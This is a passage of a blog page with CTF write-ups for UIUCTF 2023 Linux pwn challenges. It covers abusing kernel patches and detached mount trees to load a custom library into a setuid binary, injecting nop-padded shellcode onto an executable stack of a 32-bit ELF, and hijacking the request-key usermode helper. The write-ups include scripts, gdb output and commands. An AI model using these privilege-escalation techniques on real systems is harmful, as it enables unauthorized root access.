+</span></span><span style=display:flex><span> }
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#f92672>-- 
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span>2.41.0
+</span></span></code></pre></div><p>This patch allows <code>setuid</code> binary behavior if the user namespace that is holding the current mount is the same as the current user namespace of the task.</p><p>The goal of this challenge is still the same as the previous one: try to make the <code>setuid</code> binary loads our custom library. How can we abuse the patches to achieve that?</p><p>By calling <code>SYS_open_tree</code> with <code>OPEN_TREE_CLONE</code>, the tree will be in a detached state. We can attach the tree using <code>SYS_move_mount</code>, but it requires <code>CAP_SYS_ADMIN</code> in order to modify the mount table. Interestingly, in detached state, the root of the tree will be at <code>/</code>. If we call <code>SYS_execveat</code> using the detached tree as the <code>dirfd</code>, <code>/proc/self/exe</code> symlink will not be the full path to the binary. Example in pseudocode:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>SYS_open_tree</span>(AT_FDCWD, <span style=color:#e6db74>&#34;/usr/lib/zapps&#34;</span>, OPEN_TREE_CLONE <span style=color:#f92672>|</span> AT_RECURSIVE)
+</span></span><span style=display:flex><span><span style=color:#a6e22e>SYS_execveat</span>(fd, <span style=color:#e6db74>&#34;build/exe&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#75715e>// /proc/self/exe now links to /build/exe
+</span></span></span></code></pre></div><p>This is convenient because the loader code of <code>zapps</code> finds <code>ld.so</code> using <code>/proc/self/exe</code> link (file <code>zapps-crt0.c</code> in the handout package):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#66d9ef>char</span> ld_rel[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/ld-linux-x86-64.so.2&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// ...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    exe_path_len <span style=color:#f92672>=</span> <span style=color:#a6e22e>_zapps_sys_readlink</span>((<span style=color:#66d9ef>char</span> []){<span style=color:#e6db74>&#34;/proc/self/exe&#34;</span>}, ld, PATH_MAX);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (exe_path_len <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> exe_path_len <span style=color:#f92672>&gt;=</span> PATH_MAX)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>_zapps_die</span>(<span style=color:#e6db74>&#34;Zapps: Fatal: failed to readlink /proc/self/exe</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ld[exe_path_len] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span><span style=color:#a6e22e>_zapps_strrchr</span>(ld, <span style=color:#e6db74>&#39;/&#39;</span>) <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_zapps_strncat</span>(ld, ld_rel, <span style=color:#66d9ef>sizeof</span>(ld) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ld_fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>_zapps_sys_open</span>(ld, O_RDONLY <span style=color:#f92672>|</span> O_CLOEXEC);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (ld_fd <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>_zapps_die</span>(<span style=color:#e6db74>&#34;Zapps: Fatal: failed to open ld.so</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span></code></pre></div><p>But we cannot freely create any directory as <code>user</code>. Fortunately, patch #1 allows us to do cross loopback mount between mount namespaces. We will do the following:</p><ul><li>Fork the process</li><li>In the child process:<ul><li>Call <code>unshare(CLONE_NEWUSER | CLONE_NEWNS)</code> to enter a new mount namespace and have <code>CAP_SYS_ADMIN</code> so we can modify the mount table</li><li>Bind mount <code>/usr/lib/zapps</code> to <code>/home/user/home/user</code></li><li>Call <code>SYS_open_tree(AT_FDCWD, "/home/user", 0)</code> to open a tree <code>fd</code></li><li>Start an infinite loop to keep the namespaces</li></ul></li><li>In the original process:<ul><li>Sleep to wait for the child to complete all mount operations</li><li>Call <code>fd = SYS_open_tree(AT_FDCWD, "/proc/&lt;child_pid>/fd/3", OPEN_TREE_CLONE | AT_RECURSIVE)</code> to clone a detached tree of <code>/home/user</code> in the child mount namespace (patch #2 allows <code>user</code> to do this)</li><li>Call <code>SYS_execveat(fd, "home/user/build/exe")</code> to launch the binary (patch #3 allows the <code>setuid</code> behavior even though the tree is in another mount namespace)</li></ul></li></ul><p>When the binary is executed, <code>/proc/self/exe</code> links to <code>/home/user/build/exe</code>. Copy <code>*so*</code> files from <code>/usr/lib/zapps/build/</code> to <code>/home/user/build/</code>, patch <code>ld</code> and create a custom <code>lib.so</code> like previous challenge and we will get a root shell.</p><p>Flag: <code>uiuctf{is-kernel-being-overly-cautious-5ba2e5c4}</code></p><h2 id=virophage>Virophage</h2><blockquote><p>This challenge is inspired by TSJ CTF 2022&rsquo;s <a class=link href=https://github.com/XxTSJxX/TSJ-CTF-2022/tree/main/Pwn/Virus target=_blank rel=noopener>&ldquo;virus&rdquo; challenge</a>.</p></blockquote><blockquote><p>I thought a virus could be even tinier, but I there&rsquo;s a catch: are viruses alive or dead? What separates living organisms from lifeless objects? Can viruses <a class=link href=https://en.wikipedia.org/wiki/Virophage target=_blank rel=noopener>infect other viruses</a>?</p></blockquote><blockquote><p><strong>Note: This challenge has not been solved by the author.</strong> <a class=link href=https://xkcd.com/356/ target=_blank rel=noopener>Have fun!</a></p></blockquote><p>The challenge&rsquo;s executable (the spawner) is a <code>setuid</code> binary, owned by <code>root</code> at <code>/home/user/virophage</code>.
+It will do the following:</p><ul><li>Isolate <code>/tmp</code> by changing into another mount namespace</li><li>Ask the user to provide a number in hex, called <code>phage</code> in the source code</li><li>Create a 32-bit ELF file at <code>/tmp/virus</code> with this header:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>    Elf32_Ehdr ehdr;
+</span></span><span style=display:flex><span>    Elf32_Phdr phdr;
+</span></span><span style=display:flex><span>} data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    .ehdr <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        .e_ident <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>            ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3,
+</span></span><span style=display:flex><span>            ELFCLASS32, ELFDATA2LSB, EV_CURRENT,
+</span></span><span style=display:flex><span>            ELFOSABI_SYSV
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        .e_type <span style=color:#f92672>=</span> ET_EXEC,
+</span></span><span style=display:flex><span>        .e_machine <span style=color:#f92672>=</span> EM_386,
+</span></span><span style=display:flex><span>        .e_version <span style=color:#f92672>=</span> EV_CURRENT,
+</span></span><span style=display:flex><span>        .e_entry <span style=color:#f92672>=</span> phage,
+</span></span><span style=display:flex><span>        .e_ehsize <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(Elf32_Ehdr),
+</span></span><span style=display:flex><span>        .e_phentsize <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(Elf32_Phdr),
+</span></span><span style=display:flex><span>        .e_phnum <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>,
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    .phdr <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        .p_type <span style=color:#f92672>=</span> PT_NULL,
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><ul><li>Change effective user id to <code>root</code></li><li>Disable ASLR for child process (or execve&rsquo;d by this process) by calling <code>SYS_personality(ADDR_NO_RANDOMIZE)</code></li><li>Execute <code>/tmp/virus</code></li></ul><p>From the ELF header, we can see that the number we entered will be used as the entry address of the virus.
+How can we execute code? Using the provided test environment, let&rsquo;s attach <code>gdb</code> to it:</p><pre tabindex=0><code>(gdb) r
+Starting program: /home/user/virophage
+Please enter a number in hex: 0x0
+You entered: 0x00000000
+execve...
+process 70 is executing new program: /tmp/virus
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+</code></pre><p>As expected, the program crashes at where we set the entry point. Examine the mappings:</p><pre tabindex=0><code>(gdb) info proc mappings
+process 70
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset  Perms   objfile
+        0xf7ff8000 0xf7ffc000     0x4000        0x0  r--p   [vvar]
+        0xf7ffc000 0xf7ffe000     0x2000        0x0  r-xp   [vdso]
+        0xfffdd000 0xffffe000    0x21000        0x0  rwxp   [stack]
+(gdb)
+</code></pre><p>Notice that permission of the stack is <code>rwxp</code>, which means we can execute code on stack. Why does this happen?
+Reading through <a class=link href=https://man7.org/linux/man-pages/man5/elf.5.html target=_blank rel=noopener>the <code>man</code> page of ELF</a>,
+we know that <code>PT_GNU_STACK</code> program header is used to control the state of the stack (R, W, X)
+base on the <code>p_flag</code> field in <code>Elf32_Phdr</code> structure. But in the generated header of the virus, that header is not available.
+So what is the default permission of the stack? Why isn&rsquo;t it non-executable by default? Let&rsquo;s look at the kernel:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * An executable for which elf_read_implies_exec() returns TRUE will
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * have the READ_IMPLIES_EXEC personality flag set automatically.
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * The decision process for determining the results are:
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *                 CPU: | lacks NX*  | has NX, ia32     | has NX, x86_64 |
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * ELF:                 |            |                  |                |
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * ---------------------|------------|------------------|----------------|
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * missing PT_GNU_STACK | exec-all   | exec-all         | exec-none      |
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * PT_GNU_STACK == RWX  | exec-stack | exec-stack       | exec-stack     |
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * PT_GNU_STACK == RW   | exec-none  | exec-none        | exec-none      |
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *  exec-all  : all PROT_READ user mappings are executable, except when
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *              backed by files on a noexec-filesystem.
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *  exec-none : only PROT_EXEC user mappings are executable.
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *  exec-stack: only the stack and PROT_EXEC user mappings are executable.
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *  *this column has no architectural effect: NX markings are ignored by
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *   hardware, but may have behavioral effects when &#34;wants X&#34; collides with
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *   &#34;cannot be X&#34; constraints in memory permission flags, as in
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *   https://lkml.kernel.org/r/20190418055759.GA3155@mellanox.com
+</span></span></span><span style=display:flex><span><span style=color:#75715e> *
+</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define elf_read_implies_exec(ex, executable_stack)	\
+</span></span></span><span style=display:flex><span><span style=color:#75715e>	(mmap_is_ia32() &amp;&amp; executable_stack == EXSTACK_DEFAULT)
+</span></span></span></code></pre></div><p>The virus is a 32-bit ELF, so the decision will be <code>exec-all</code>. Along with the fact that ASLR is disabled for the virus,
+we can point the entry address to the stack and execute code. But how do we put code on the stack? Looking at the entry point of the spawner:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>virophage_start_main</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>stack)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>argv, <span style=color:#f92672>*</span>envp;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> i;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> argc;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	argc <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uintptr_t</span>)<span style=color:#f92672>*</span>stack<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	argv <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)stack;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> argc; i<span style=color:#f92672>++</span>)
+</span></span><span style=display:flex><span>		stack<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>	stack<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	envp <span style=color:#f92672>=</span> stack;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>_vp_sys_exit</span>(<span style=color:#a6e22e>virophage_main</span>(argc, argv, envp));
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>__asm__</span> (
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;.globl _start</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;.section .text,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>ax</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>,@progbits</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;.type _start, @function</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;_start:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;	mov %rsp, %rdi</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;	call virophage_start_main</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;	hlt</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>All arguments and environment variables that we pass to the spawner will be available on the stack.
+Later, the virus is executed using the following parameters:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>_vp_sys_execve</span>(<span style=color:#e6db74>&#34;/tmp/virus&#34;</span>, argv, envp);
+</span></span></code></pre></div><p>That means the virus will inherit all arguments and environment variables of the spawner. These will also be on the virus&rsquo;s stack.
+We can pass a non-null shellcode as an argument for the spawner then point the entry address of the virus to it.
+Padding some <code>nop</code> instructions before the actual shellcode will make it easier to identify on the stack.
+I used the following script to generate a base64 encoded shellcode:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;i386&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>os <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;linux&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(b64e(asm(shellcraft<span style=color:#f92672>.</span>cat(<span style=color:#e6db74>&#39;/mnt/flag&#39;</span>))<span style=color:#f92672>.</span>rjust(<span style=color:#ae81ff>0x100</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#39;</span>)))
+</span></span></code></pre></div><p>Save the output to <code>/home/user/arg</code>. Now attach the <code>gdb</code> to the spawner again and find where our shellcode is:</p><pre tabindex=0><code>(gdb) file virophage
+Reading symbols from virophage...
+(gdb) r $(base64 -d /home/user/arg)
+Starting program: /home/user/virophage $(base64 -d /home/user/arg)
+Please enter a number in hex: 0x0
+You entered: 0x00000000
+execve...
+process 123 is executing new program: /tmp/virus
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+(gdb) find $esp, +0x200, (int)0x90909090
+0xffffde22
+0xffffde23
+0xffffde24
+0xffffde25
+0xffffde26
+0xffffde27
+0xffffde28
+0xffffde29
+0xffffde2a
+0xffffde2b
+0xffffde2c
+0xffffde2d
+0xffffde2e
+0xffffde2f
+0xffffde30
+...
+</code></pre><p>I choose <code>0xffffde30</code> as the entry point to avoid any alignment problems.
+Now we go to the server, write the encoded shellcode to <code>/home/user/arg</code> and run the spawner:</p><pre tabindex=0><code>uiuctf-2023:~$ ./virophage $(base64 -d /home/user/arg)
+Please enter a number in hex: 0xffffde30
+You entered: 0xFFFFDE30
+execve...
+uiuctf{windows_defender_wont_catch_this_bc238ba4}
+Segmentation fault
+</code></pre><h2 id=am-i-not-root>Am I not root?</h2><blockquote><p>Ever wondered why nsjail prints a giant warning when it&rsquo;s run as root? Well, now you know ;)</p></blockquote><p>Hint:</p><blockquote><p>I disabled coredumps and modules. What else are there?</p></blockquote><p>The first thing that came to my mind was loading a kernel module, but it is disabled.
+Then I remember that <code>/sbin/modprobe</code> will be called by the kernel if I execute a file with unknown magic bytes.
+But since kernel module loading is disabled, we cannot use it too. What else we can use to make the kernel execute our code?</p><p>The kernel will sometimes call user mode helper like <code>/sbin/modprobe</code> using <code>call_usermodehelper_setup</code> and <code>call_usermodehelper_exec</code>.
+<code>call_usermodehelper</code> will call both functions.</p><p>Finding references to those functions, I found an interesting call in
+<a class=link href=https://elixir.bootlin.com/linux/v6.1.32/source/security/keys/request_key.c#L196 target=_blank rel=noopener><code>security/keys/request_key.c</code></a>,
+which will calls <code>/sbin/request-key</code>. Searching for it, I came to <a class=link href=https://www.kernel.org/doc/html/v4.15/security/keys/request-key.html target=_blank rel=noopener>the documentation of Key Request Service</a>.
+According to the documentation, we can make the kernel execute <code>/sbin/request-key</code> by calling <code>SYS_request_key</code> syscall.</p><p>Since we are root, we can create <code>/sbin/request-key</code> file. I populated it with the following script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/sh
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>cat /mnt/flag &gt; /tmp/flag
+</span></span></code></pre></div><p>We also have to run <code>chmod +x /sbin/request-key</code> to make it executable.</p><p>After that, I call <code>SYS_request_key</code> using the example in
+<a class=link href=https://man7.org/linux/man-pages/man2/request_key.2.html target=_blank rel=noopener>the <code>man</code> page of <code>SYS_request_key</code></a>, and the flag were written to <code>/tmp/flag</code>.</p><pre tabindex=0><code>uiuctf-2023:/home/user# ./a.out user mtk:key1 &#34;Payload data&#34;
+request_key: Required key not available
+uiuctf-2023:/home/user# cat /tmp/flag
+uiuctf{need_more_isolations_for_root_5a4bb464}
+</code></pre></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>ctf</a>
+<a href=/tags/pwn/>pwn</a></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/post/ctf-writeups/alles-ctf/2021/csgo/><div class=article-details><h2 class=article-title>ALLES! CTF 2021 - 🔥 Counter Strike: Squirrel Offensive</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2023 nyancat0131</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.16.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
